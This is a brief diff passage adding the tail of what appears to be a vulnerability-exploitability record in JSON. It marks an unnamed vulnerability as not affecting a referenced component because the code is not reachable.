+      "published" : "2025-02-14T04:15:09Z",
+      "updated" : "2026-06-17T09:01:57Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable",
+        "detail" : "Not used."
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    }
+  ]
+}
